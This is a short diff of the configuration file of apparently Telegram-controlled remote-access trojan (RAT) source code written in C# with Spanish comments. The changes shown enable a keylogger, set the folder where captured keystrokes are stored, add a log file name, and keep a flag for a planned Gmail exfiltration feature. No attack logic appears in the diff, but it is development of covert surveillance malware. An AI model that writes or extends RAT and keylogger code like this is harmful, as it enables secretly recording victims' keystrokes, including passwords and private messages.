@@ -25,9 +25,10 @@ namespace RAT_BotTelegram {
         public const int    DELAY = 1;                  // Delay despues de iniciar el sistema // Para computadoras sin SSD
 
         //Config Keylogger 
-        public const bool   KEYLOGGER = true;           // True = Keylogger activo  // False = Keylogger deshabilitado
-        public const string PATH_LOG= @"C:\Users\Public\RAT_Telegram";               // Ruta donde se guardará el registro de teclas
-        public const bool   SEND_GMAIL = false;         // Futura actualización                     
+        public const bool   KEYLOGGER   = true;           // True = Keylogger activo  // False = Keylogger deshabilitado
+        public const string PATH_LOG    = @"C:\Users\Public\RAT_Telegram";               // Ruta donde se guardará el registro de teclas
+        public const string LOG         = "reg.k";  //Archivo registro.
+        public const bool   SEND_GMAIL  = false;         // Futura actualización                     
         //public const string SEND_Gmail = "";
         //public const string  = "";
         //public const string  = "";
